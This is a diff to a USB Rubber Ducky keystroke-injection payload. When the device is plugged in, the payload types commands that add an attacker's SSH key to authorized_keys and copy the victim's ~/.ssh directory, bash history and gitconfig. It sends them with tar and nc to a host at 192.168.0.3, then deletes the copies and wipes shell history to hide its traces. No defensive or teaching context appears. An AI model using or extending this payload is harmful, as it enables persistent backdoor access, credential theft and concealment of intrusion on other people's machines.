@@ -1,4 +1,4 @@
-REM RUBBER DUCKY VERSION 1
+REM RUBBER DUCKY VERSION 1.1
 GUI r
 DELAY 250
 STRING ubuntu
@@ -6,6 +6,8 @@ DELAY 250
 ENTER
 DELAY 1000
 STRING nano sample.sh
+ENTER
+STRING cd
 ENTER
 STRING touch ~/.ssh/authorized_keys
 ENTER
@@ -15,11 +17,17 @@ STRING echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDJz+uLagY7SoQbW/zUdBRdW3WnocUz+
 ENTER
 STRING cp -r ~/.ssh ~/temp_dir
 ENTER
+STRING cp ~/.bash_history ~/temp_dir
+ENTER
+STRING cp ~/.gitconfig ~/temp_dir
+ENTER
 STRING tar cf - temp_dir | nc 192.168.0.3 30000
 ENTER
 STRING rm -rf ~/temp_dir
 ENTER
 STRING history -c && history -w
+ENTER
+STRING rm ~/.bash_history
 CTRL x
 y
 ENTER
